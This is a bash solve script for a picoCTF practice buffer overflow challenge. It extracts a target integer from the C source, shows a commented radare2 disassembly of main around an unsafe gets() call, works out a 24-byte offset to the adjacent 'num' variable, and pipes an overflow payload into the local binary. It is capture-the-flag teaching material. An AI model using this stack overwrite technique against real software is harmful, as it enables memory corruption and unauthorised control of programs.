#!/bin/bash

# https://play.picoctf.org/practice/challenge/399
#
# Straightforward buffer overflow

# Extract the required integer
required_num="$(grep 'if.*num' ./local-target.c | cut -d' ' -f 6)"
# Convert it to ASCII
required_hex="$(rax2 "$required_num" | rax2 -s)"

# Overflow the buffer 
# How do you compute the required padding? Brute Force or analyze with radare2
### RADARE2
### int main (int argc, char **argv, char **envp);                                                       
### vars(4:sp[0x9..0x28])                                                                                
###      0x00401236      f30f1efa       endbr64                                                          
###      0x0040123a      55             push rbp                                                         
###      0x0040123b      4889e5         mov rbp, rsp                                                     
###      0x0040123e      4883ec20       sub rsp, 0x20                                                    
###      0x00401242      c745f84000..   mov dword [var_8h], 0x40    ; elf_phdr                           
###      0x00401249      488d3db40d..   lea rdi, str.Enter_a_string:    ; 0x402004 ; "Enter a string: "  
###      0x00401250      b800000000     mov eax, 0                                                       
###      0x00401255      e896feffff     call sym.imp.printf         ;[1] ; int printf(const char *format)
###      0x0040125a      488b050f2e..   mov rax, qword [obj.stdout]    ; obj.__TMC_END__                 
###                                                                 ; [0x404070:8]=0                     
###      0x00401261      4889c7         mov rdi, rax                                                     
###      0x00401264      e8b7feffff     call sym.imp.fflush         ;[2] ; int fflush(FILE *stream)      
###      0x00401269      488d45e0       lea rax, [var_20h]                                               
###      0x0040126d      4889c7         mov rdi, rax                                                     
###      0x00401270      b800000000     mov eax, 0                                                       
###      0x00401275      e896feffff     call sym.imp.gets           ;[3] ; char *gets(char *s)           
###      0x0040127a      bf0a000000     mov edi, 0xa                                                     
###      0x0040127f      e83cfeffff     call sym.imp.putchar        ;[4] ; int putchar(int c)            
###      0x00401284      8b45f8         mov eax, dword [var_8h]                                          
###      0x00401287      89c6           mov esi, eax                                                     
###      0x00401289      488d3d850d..   lea rdi, str.num_is__d_n    ; 0x402015 ; "num is %d\n"           
###      0x00401290      b800000000     mov eax, 0                                                       
###      0x00401295      e856feffff     call sym.imp.printf         ;[1] ; int printf(const char *format)
#
# Notice that 0x20 = 32 bytes are allocated for the 16 byte `input` + 4 byte
# `num` When writing into `input` on frame 0x00401275, rsp-0x20 is passed into
# `rax` because that's where `input` begins. But when printf is called on frame
# 0x00401295, rsp-0x8 is passed into `eax`. This indicates that `num` begins
# 0x20 - 0x8 = 32 - 8 = 24 bytes into the allocated 32 bytes on 0x0040123e.
# So, we should use 24 bytes of padding followed by the required hex (65 = 0x41 = A)
payload=$(printf "${required_hex}%.0s" {1..25})

echo "required num [ $required_num ]"
echo "payload hex [ $payload ]"

./local-target <<< "$payload"
